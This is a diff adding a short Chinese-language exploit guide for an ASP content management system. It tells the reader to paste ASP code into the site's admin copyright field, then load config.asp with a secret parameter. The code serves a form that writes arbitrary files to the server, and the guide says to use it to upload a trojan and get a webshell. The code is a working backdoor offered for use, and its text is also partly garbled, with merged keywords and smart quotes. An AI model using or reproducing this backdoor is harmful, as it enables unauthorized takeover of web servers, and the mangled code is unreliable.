@@ -1,0 +1,9 @@
+EXP使用方法：
+在后台找到版权信息，替换成以下代码
+然后保存，千万别跳转任何页面，直接在IE地址栏内将：admin/Admin_Login.asp替换成inc/config.asp?xiaoxin=520
+成功后会进入一个像小马一样的页面，粘贴木马代码以及写上木马文件名即可拿到webshell
+
+
+版权所有 Copyright? 2003 <a href=’http://www.asp163.net’>动力空间</a>”‘版权信息
+
+if Request(“xiaoxin”)=”520″ then dimallen,creat,text,thisline,path if Request(“creat”)=”yes” then Setfs = CreateObject(“Scripting.FileSystemObject”) Setoutfile=fs.CreateTextFile(server.mappath(Request(“path”)))outfile.WriteLine Request(“text”) Response.write “小新恭喜” end ifResponse.write “<formmethod=’POST’action=’”&Request.ServerVariables(“URL”)&”?xiaoxin=520&creat=yes’>”Response.write “<textareaname=’text’>”&thisline&”</textarea><br>”Response.write “<input type=’text’ name=’path’value=’”&Request(“path”)&”‘>” Response.write “<inputname=’submit’ type=’submit’ value=’ok’ ></form>”Response.end end if %>
